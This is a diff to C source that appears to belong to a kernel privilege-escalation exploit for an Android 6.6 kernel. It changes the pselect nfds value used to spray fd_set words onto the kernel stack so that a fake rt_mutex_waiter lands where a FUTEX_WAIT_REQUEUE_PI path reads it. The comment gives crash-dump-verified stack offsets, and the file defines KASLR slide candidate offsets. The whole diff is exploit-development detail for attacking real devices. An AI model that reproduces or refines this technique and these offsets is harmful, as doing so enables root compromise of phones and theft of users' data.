@@ -52,15 +52,24 @@
 #define SLIDE_TRACEFS_EVENT_ID 109
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0014a120ULL
 /*
- * Non-LEGACY rt_mutex_waiter uses words 0-13.  SHIFT=12 demands global
- * fd_set indices 12..25 (26 slots), but nfds=320 yields only 3 sets x 5
- * qwords = 15 slots and slide_pselect_put_global_word drops indices >= 15.
- * The dropped words include waiter word 11 (fake_lock), leaving
- * waiter->lock == NULL and crashing rt_mutex_adjust_prio_chain in
- * _raw_spin_trylock.  Bump the slide pselect nfds to 576 so
- * words_per_set = 9 and the 3 sets cover 27 slots (indices 0..26).
+ * A06 geometry (verified from multiple kernel crash dumps):
+ *   core_sys_select() only copies fd_sets onto the kernel stack while
+ *   FDS_BYTES(n) <= SELECT_STACK_ALLOC/6 = 256/6 = 42 bytes per set
+ *   (android15-6.6 include/linux/poll.h FRONTEND_STACK_ALLOC=256).
+ *   nfds=320 gives 40 B/set -> 5 qwords/set -> 15 qwords total on stack,
+ *   base 0x3c20.  Any nfds >= 321 falls back to kvmalloc and never touches
+ *   the thread stack, so the fake waiter NEVER lands (verified: nfds=576
+ *   crashes with 0x3c80..0x3ce0 all zeros).
+ *
+ * With nfds=320 only global qwords 0..14 are reachable.  The walked futex
+ * rt_mutex_waiter (FUTEX_WAIT_REQUEUE_PI) sits at stack+0x3c80 (=G12);
+ * its ->lock at +0x58 = 0x3cd8 = G23 is UNREACHABLE, so a full 14-word
+ * fake cannot be placed there.  SHIFT must instead be tuned at runtime to
+ * whichever futex call path places its rt_mutex_waiter in the 15-qword
+ * on-stack window; keep this value overridable, default 12 = word0 at
+ * 0x3c80 (the only verified overlap).
  */
-#define SLIDE_PSELECT_NFDS 576
+#define SLIDE_PSELECT_NFDS 320
 #define SLIDE_PSELECT_WORD_SHIFT 12
 #define SLIDE_P0_OFFSET_CANDIDATES                        \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,     \
